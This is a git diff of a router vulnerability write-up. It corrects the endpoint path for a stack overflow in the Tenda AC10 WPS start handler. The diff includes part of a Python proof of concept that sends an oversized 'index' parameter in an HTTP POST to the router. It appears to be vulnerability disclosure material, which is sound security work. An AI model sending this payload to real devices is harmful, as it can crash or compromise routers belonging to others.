@@ -18,7 +18,7 @@
 
 ![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/AC10/formWifiWpsStart/img/3.png)
 
-/goform/formWifiWpsStart，The index and mode are controllable. If the conditions are met to sprintf, they will be spliced into tmp. It is worth noting that there is no size check,which leads to a stack overflow vulnerability.
+/goform/WifiWpsStart，The index and mode are controllable. If the conditions are met to sprintf, they will be spliced into tmp. It is worth noting that there is no size check,which leads to a stack overflow vulnerability.
 
 ## Poc
 
@@ -41,7 +41,7 @@ rn = b'\r\n'
 p1 = b'a' * 0x3000
 p2 = b'mode=1&index=' + p1
 
-p3 = b"POST /goform/formWifiWpsStart" + b" HTTP/1.1" + rn
+p3 = b"POST /goform/WifiWpsStart" + b" HTTP/1.1" + rn
 p3 += b"Host: 192.168.0.1" + rn
 p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
 p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
